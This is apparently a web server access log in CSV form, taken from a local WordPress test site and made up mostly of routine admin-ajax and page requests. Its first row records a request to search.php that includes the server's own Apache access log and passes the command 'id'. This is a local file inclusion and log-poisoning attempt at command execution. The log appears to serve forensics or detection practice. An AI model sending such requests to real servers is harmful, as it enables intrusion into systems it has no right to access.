timestamp,sourceIP,HTTP_method,page,referrer,response_code,response_size,user-agent
25/Oct/2022:15:36:33,172.18.1.1,GET,/search.php?file=/var/log/apache2/access.log&c=id,"""-""",200,3873,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:36:14,172.18.1.1,GET,/,"""-""",200,11169,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:36:15,172.18.1.1,GET,/wp-includes/css/admin-bar.min.css?ver=6.0.3,"""http://localhost:8080/""",200,4163,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:16:02,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:14:01,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:13:01,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:11:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:09:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:08:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:06:52,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:04:52,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:02:54,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:00:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:58:52,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:57:51,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:49:28,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:47:27,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:45:26,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:43:25,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:41:24,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:39:23,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:38:22,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:36:21,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:35:23,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:35:21,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:34:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:06,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:01,172.18.1.1,POST,/wp-admin/post.php,"""http://localhost:8080/wp-admin/""",200,1078,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
